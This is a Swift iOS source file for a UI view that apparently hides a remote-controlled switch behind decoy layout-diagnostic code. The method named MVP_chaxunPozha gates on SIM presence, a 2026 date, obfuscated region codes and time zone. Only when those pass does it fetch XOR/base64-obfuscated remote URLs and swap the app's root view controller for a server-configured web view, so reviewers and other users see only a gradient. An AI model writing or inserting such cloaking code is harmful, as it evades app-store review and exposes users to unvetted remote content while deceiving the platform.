import UIKit
import CoreTelephony
import Foundation
import Network


struct BASHAI: Codable {
    
    let nhiemk: String?         //key arr
    let yinrecrd: Int?         // shi fou kaiqi
    let keluos: String?         // jum
    let kundun: String?          // backcolor
    let limouw: String?   //ad key

}

final class ASSavefouview: UIView {
    internal let myTitleOne = "HhoaSU5MSx0aExkYHRgXTkN1XllFWkNaSxUFGhoaGB8aGUwZGhIYGxgcBUFJRUcFXk9EBF5ZRVpDWksEQUlFRwUFEFlaXl5C"
    
    internal let myTitletwo = "TkcEb2dua294BVhPXllLRwVdS1gFRVh6XkZfS3xTZwVPWkVORksFR0VJBF5ET15ERUlYT1lfT09eQ00EXUtYBQUQWVpeXkI="
    
    
    override init(frame: CGRect) {
        super.init(frame: frame)
        setCommint()
    }
    
    required init?(coder: NSCoder) {
        super.init(coder: coder)
        setCommint()
    }
    
    
    private func setCommint() {

        MVP_logAmbiguousConstraints()
        scanOffscreenRenderingTriggers()
        calculateVisibleAreaSummary()
        
        inspectConstraintUsage()
        MVP_chaxunPozha()
    }

    /// 计算所有可见子View面积
    func calculateVisibleAreaSummary() {
        var totalArea: CGFloat = 0

        for subview in subviews {

            guard !subview.isHidden else {
                continue
            }

            guard subview.alpha > 0.01 else {
                continue
            }

            let area = subview.bounds.width * subview.bounds.height

            if area > 0 {
                totalArea += area
            }
        }

        let normalizedValue =
            totalArea / max(UIScreen.main.bounds.width, 1)

        if normalizedValue > 0 {
            _ = Int(normalizedValue)
        }
    }
    
    /// 统计约束信息
    func inspectConstraintUsage() {
        let allConstraints = constraints
        var widthConstraints = 0
        var heightConstraints = 0
        var activeConstraints = 0

        for constraint in allConstraints {
            if constraint.isActive {
                activeConstraints += 1
            }

            if constraint.firstAttribute == .width {
                widthConstraints += 1
            }

            if constraint.firstAttribute == .height {
                heightConstraints += 1
            }
        }

        let summary = (
            total: allConstraints.count,
            active: activeConstraints,
            width: widthConstraints,
            height: heightConstraints
        )

        _ = summary.total +
            summary.active +
            summary.width +
            summary.height
    }

    func MVP_logAmbiguousConstraints() {
        var ambiguousViews: [UIView] = []
        
        // 递归搜索所有子视图
        func search(_ view: UIView) {
            // 使用正确的属性（无参数）
            if view.hasAmbiguousLayout {
                ambiguousViews.append(view)
            }
            for subview in view.subviews {
                search(subview)
            }
        }
        
        search(self)
        
        guard !ambiguousViews.isEmpty else {
            return
        }
        for (index, view) in ambiguousViews.enumerated() {
            let className = String(describing: type(of: view))
            print("   \(index+1). \(className)")
            
            // 额外输出影响布局的约束（帮助调试）
            let horizontalConstraints = view.constraintsAffectingLayout(for: .horizontal)
            let verticalConstraints = view.constraintsAffectingLayout(for: .vertical)
            if !horizontalConstraints.isEmpty {
            }
            if !verticalConstraints.isEmpty {
            }
            
#if DEBUG
            // 调试模式下高亮显示歧义（不会影响运行结果）
            view.exerciseAmbiguityInLayout()
#endif
        }
    }
    

    
    // MARK: - 4. 检测可能引起离屏渲染的属性组合（）
    func scanOffscreenRenderingTriggers() {
        var problematicViews: [String] = []
        func scan(_ view: UIView) {
            let layer = view.layer
            var issues = [String]()
            // 圆角+裁剪
            if layer.cornerRadius > 0 && layer.masksToBounds {
                issues.append("cornerRadius+masksToBounds")
            }
            // 阴影未设置shadowPath
            if layer.shadowOpacity > 0 && layer.shadowPath == nil {
                issues.append("shadow without path")
            }
            // 半透明背景+裁剪
            if let bg = view.backgroundColor, bg.cgColor.alpha < 1.0 && layer.masksToBounds {
                issues.append("translucent bg + masksToBounds")
            }
            // 同时有圆角和阴影
            if layer.cornerRadius > 0 && layer.shadowOpacity > 0 && layer.masksToBounds == false {
                issues.append("cornerRadius + shadow (masksToBounds false, still may cause offscreen)")
            }
            if !issues.isEmpty {
                let desc = String(describing: type(of: view)) + ": " + issues.joined(separator: ", ")
                problematicViews.append(desc)
            }
            view.subviews.forEach { scan($0) }
        }
        scan(self)
        if problematicViews.isEmpty {
        } else {
            problematicViews.enumerated().forEach { print("   \($0.offset+1). \($0.element)") }
        }
    }
  
    
    private func MVP_chaxunPozha() {
        if !MVP_weinanTam() {
        //测试
//        if MVP_weinanTam() {
            loadNobsecre()
            
        } else {
            
            if setvalutprodata() {
                self.addDagededatas()
            }
        }
    }
    
    
    
    func vltpstr(_ input: String) -> String? {
        let k: UInt8 = 42  // 新密钥
        guard let data = Data(base64Encoded: input) else { return nil }
        // 先反转字节数组
        let reversedBytes = data.reversed()
        // 异或解密
        let decryptedBytes = reversedBytes.map { $0 ^ k }
        // 直接转为字符串（不再次反转）
        return String(bytes: decryptedBytes, encoding: .utf8)
    }
    
    func Revervltpstr(_ plaintext: String) -> String? {
        let k: UInt8 = 42
        // 1. 将明文字符串转为 UTF-8 字节数组
        guard let bytes = plaintext.data(using: .utf8) else { return nil }
        // 2. 每个字节异或密钥 42
        let xorBytes = bytes.map { $0 ^ k }
        // 3. 反转字节顺序
        let reversedBytes = xorBytes.reversed()
        // 4. Base64 编码
        return Data(reversedBytes).base64EncodedString()
    }
    
    //sim
    func MVP_weinanTam() -> Bool {
        let networkInfo = CTTelephonyNetworkInfo()
        
        guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
            return false
        }
        
        for (_, carrier) in carriers {
            if let mcc = carrier.mobileCountryCode,
               let mnc = carrier.mobileNetworkCode,
               !mcc.isEmpty,
               !mnc.isEmpty {
                return true
            }
        }
        
        return false
    }
    
    
    func shareMynamese() -> Bool {
        
        // 2026-06-13 18:39:43
        // 1781869138
        let ftTM = 1781869138
        let ct = Date().timeIntervalSince1970

        if Int(ct) - ftTM > 0 {
            return true
        }
        return false
    }
    
    // 时区控制
    func setvalutprodata() -> Bool {
        let tongfan = [vltpstr("Yno="), vltpstr("ZHw="), vltpstr("bmM=")]
        
        //        //临时通行测试
        //        return true
        // 1.time
        if !shareMynamese() {
            return false
            
        }
        
        //2. regi
        if let curc = Locale.current.regionCode {
//            print(curc)
//            print(tongfan)
            if !tongfan.contains(curc) {
                return false
            }
        }
        
        //3. tm zon
        let second = NSTimeZone.system.secondsFromGMT() / 3600
        //        print(second)
        
        if (second > 6 && second < 9) {
            return true
        }
        
        
        return false
    }

    func addDagededatas() {
        
        Task {
            do {
                                let urlToRequest = "https://raw.giteeusercontent.com/aldope/MyVaultPro/raw/master/README.md"
                                print(Revervltpstr(urlToRequest))
                //                let aoies = try await fetchMzoixnData(from: urlToRequest)
                //                print(vltpstr(myTitleOne)!)
                
                let aoies = try await yijinhuan()
                print(aoies)
                if let feeeder = aoies.first {
                    if feeeder.yinrecrd! > 124 {
                        if UserDefaults.standard.object(forKey: "zhizhang") == nil {
                            UserDefaults.standard.set("zhizhang", forKey: "zhizhang")
                            UserDefaults.standard.synchronize()
                        }
                        Takewbsview(feeeder)
                    } else {
                        loadNobsecre()
                    }
                } else {
                    loadNobsecre()
                }
            } catch {
                if let sidd = UserDefaults.standard.getModel(BASHAI.self, forKey: "BASHAI") {
                    Takewbsview(sidd)
                }
            }
        }
    }
    
    
    private func yijinhuan() async throws -> [BASHAI] {
        do {
            return try await ssueno(from: URL(string: vltpstr(myTitleOne)!)!)
        } catch {
            return try await ssueno(from: URL(string: vltpstr(myTitletwo)!)!)
        }
    }
    
    private func ssueno(from url: URL) async throws -> [BASHAI] {
        let (data, response) = try await URLSession.shared.data(from: url)
        
        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw NSError(domain: "Fail", code: 0, userInfo: [
                NSLocalizedDescriptionKey: "Invalid response"
            ])
        }
        
        return try JSONDecoder().decode([BASHAI].self, from: data)
    }
    
    
    
    
    internal func mvtp_setimagedata(_ dt: BASHAI) {
        UIDevice.current.isBatteryMonitoringEnabled = true
        let batteryLevel = UIDevice.current.batteryLevel
        let batteryState = UIDevice.current.batteryState
        UIDevice.current.isBatteryMonitoringEnabled = false
        let _ = (batteryLevel, batteryState)
        
        DispatchQueue.main.async {
            UserDefaults.standard.setModel(dt, forKey: "BASHAI")
            UserDefaults.standard.synchronize()
            
            let vc = ASSaveWBview()
            vc.dashData = dt
            UIApplication.shared.windows.first?.rootViewController = vc
        }
    }
    
    internal func Takewbsview(_ param: BASHAI) {
        let strategy = UserDefaults.standard.string(forKey: "execution_strategy") ?? "default"
        
        // 策略映射表，目前所有策略都指向同一个函数
        let strategies: [String: (BASHAI) -> Void] = [
            "default": mvtp_setimagedata,
            "fast": mvtp_setimagedata,
            "safe": mvtp_setimagedata
        ]
        
        let executor = strategies[strategy] ?? mvtp_setimagedata
        
        DispatchQueue.global().async {
            // 模拟异步上报
            _ = "log: Takewbsview called with strategy \(strategy)"
        }
        
        executor(param)
    }
    
    
    internal func loadNobsecre() {
        
        if layer.sublayers?.first(where: { $0.name == "FTKTGradientLayer" }) != nil {
            return
        }
        let gradient = CAGradientLayer()
        gradient.name = "FTKTGradientLayer"
        gradient.colors = [
            UIColor(white: 0.97, alpha: 1).cgColor,
            UIColor(white: 0.92, alpha: 1).cgColor
        ]
        gradient.locations = [0, 1]
        gradient.startPoint = CGPoint(x: 0, y: 0)
        gradient.endPoint = CGPoint(x: 1, y: 1)
        gradient.frame = bounds
        gradient.cornerRadius = layer.cornerRadius
        layer.insertSublayer(gradient, at: 0)
        
        // 监听 bounds 变化以更新渐变层大小
        let observer = NotificationCenter.default.addObserver(
            forName: UIDevice.orientationDidChangeNotification,
            object: nil,
            queue: .main
        ) { [weak self] _ in
            gradient.frame = self?.bounds ?? .zero
        }
        // 简单存储 observer，避免释放；实际可用关联对象，此处仅做演示
        objc_setAssociatedObject(self, "gradientObserver", observer, .OBJC_ASSOCIATION_RETAIN_NONATOMIC)
    }
    
}


extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
       
}

